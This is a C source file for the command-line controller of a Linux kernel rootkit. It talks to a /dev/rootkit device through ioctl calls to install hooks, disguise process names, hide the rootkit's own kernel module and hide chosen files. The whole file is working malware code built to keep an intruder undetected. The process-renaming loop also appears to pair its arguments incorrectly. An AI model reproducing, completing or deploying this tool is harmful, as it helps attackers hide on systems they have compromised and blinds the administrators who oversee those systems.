#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include "rootkit.h"

int main(int argc, char *argv[]) {

	int fd;

	if (argc <= 1) {
		fprintf(stderr, "no command given\n");
		exit(-1);
	}

	fd = open("/dev/rootkit", O_RDWR);
	if (fd < 0) {
		fprintf(stderr, "failed to open /dev/rootkit: %s\n", strerror(errno));
		exit(-1);
	}

	if (strcmp(argv[1], "hook") == 0) {

		if (ioctl(fd, IOCTL_MOD_HOOK) < 0) {
			fprintf(stderr, "hook failed: %s\n", strerror(errno));
			exit(-1);
		}

	} else if (strcmp(argv[1], "masq") == 0) {

		int n;
		int i;
		struct masq_proc *masq;
		struct masq_proc_req req;

		if (argc <= 2) {
			fprintf(stderr, "no request provided\n");
			exit(-1);
		}

		if (argc % 2 != 0) {
			fprintf(stderr, "request format error\n");
			exit(-1);
		}
		n = (argc - 2) / 2;

		masq = (struct masq_proc *)malloc(sizeof(struct masq_proc) * n);
		for (i = 0; i < n; i++) {
			strncpy(masq[i].new_name, argv[2 + i], MASQ_LEN);
			strncpy(masq[i].orig_name, argv[2 + i + 1], MASQ_LEN);
		}

		req.len = n;
		req.list = masq;

		if (ioctl(fd, IOCTL_MOD_MASQ, &req) < 0) {
			fprintf(stderr, "masq failed: %s\n", strerror(errno));
			exit(-1);
		}

	} else if (strcmp(argv[1], "hide-mod") == 0) {


		if (ioctl(fd, IOCTL_MOD_HIDE) < 0) {
			fprintf(stderr, "hide-mod failed: %s\n", strerror(errno));
			exit(-1);
		}

	} else if (strcmp(argv[1], "hide-file") == 0) {

		struct hided_file hide;

		if (argc != 3) {
			fprintf(stderr, "request format error\n");
			exit(-1);
		}

		strncpy(hide.name, argv[2], NAME_LEN);
		hide.len = strlen(hide.name);

		if (ioctl(fd, IOCTL_FILE_HIDE, &hide) < 0) {
			fprintf(stderr, "hide-file failed: %s\n", strerror(errno));
			exit(-1);
		}

	} else {

		fprintf(stderr, "unknown command\n");
		exit(-1);

	}

	return 0;
}
